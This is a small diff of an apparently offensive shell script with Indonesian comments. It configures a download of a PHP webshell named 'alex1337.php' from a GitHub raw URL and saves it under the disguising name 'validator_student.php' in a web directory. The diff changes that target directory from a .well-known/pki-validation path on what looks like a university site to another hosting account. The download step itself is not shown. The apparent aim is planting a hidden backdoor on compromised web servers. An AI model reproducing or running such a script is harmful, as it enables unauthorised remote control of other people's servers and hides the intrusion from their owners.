@@ -2,7 +2,7 @@
 
 # Konfigurasi
 URL="https://raw.githubusercontent.com/alexithema/webshell/refs/heads/main/alex1337.php"
-DOWNLOAD_DIR="/home/openpxmb/register.openarc.edu.lk/.well-known/pki-validation/"
+DOWNLOAD_DIR="/home/gmrjorid/web_pagu/"
 OUTPUT_FILE="validator_student.php"
 OUTPUT_PATH="$DOWNLOAD_DIR/$OUTPUT_FILE"
 
